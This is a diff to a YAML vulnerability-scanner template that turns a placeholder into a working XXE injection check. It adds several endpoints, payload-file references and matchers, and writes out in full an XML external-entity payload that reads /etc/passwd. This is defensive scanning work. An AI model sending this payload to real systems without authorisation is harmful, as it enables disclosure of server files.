@@ -1,26 +1,97 @@
-id: xxe-vulnerable
+id: xxe-detection
 
 info:
-  name: XML External Entity (XXE)
+  name: XML External Entity (XXE) Injection
   author: khushi-nirsang
-  severity: high
+  severity: critical
   description: |
-    Placeholder XXE template.
-    Full XXE detection requires XML payload support
-    which is not yet implemented in the scanner engine.
+    Detects XML External Entity (XXE) injection vulnerabilities
+    through XXE payload injection and response analysis.
+  tags:
+    - xxe
+    - injection
+    - a03:2021
 
 requests:
   - method: POST
 
     path:
       - "{{BaseURL}}/upload"
+      - "{{BaseURL}}/api/parse"
+      - "{{BaseURL}}/xml/process"
+      - "{{BaseURL}}/parse"
 
     headers:
       Content-Type: application/xml
 
-    body: "<test>xxe</test>"
+    payloads:
+      - "payloads/xxe/xxe-basic.txt"
+      - "payloads/xxe/xxe-file-disclosure.txt"
+      - "payloads/xxe/xxe-blind-oob.txt"
 
     matchers:
+
+      - type: word
+        part: body
+        words:
+          - "root:x:"
+          - "system32"
+          - "DOCTYPE"
+          - "ENTITY"
+          - "SYSTEM"
+          - "file://"
+        condition: or
+
+      - type: regex
+        part: body
+        regex:
+          - "(?i)xxe"
+          - "(?i)xml.*error"
+          - "(?i)entity"
+
       - type: status
         status:
           - 200
+          - 500
+
+    matchers-condition: and
+
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
+          - "ENTITY.*SYSTEM"
+
+  - method: POST
+
+    path:
+      - "{{BaseURL}}/api/xml"
+      - "{{BaseURL}}/soap"
+
+    headers:
+      Content-Type: text/xml
+
+    body: |
+      <?xml version="1.0" encoding="UTF-8"?>
+      <!DOCTYPE foo [
+        <!ELEMENT foo ANY>
+        <!ENTITY xxe SYSTEM "file:///etc/passwd">
+      ]>
+      <foo>&xxe;</foo>
+
+    matchers:
+
+      - type: word
+        part: body
+        words:
+          - "root:"
+          - "bin/bash"
+          - "daemon:"
+        condition: or
+
+      - type: status
+        status:
+          - 200
+
+    matchers-condition: and
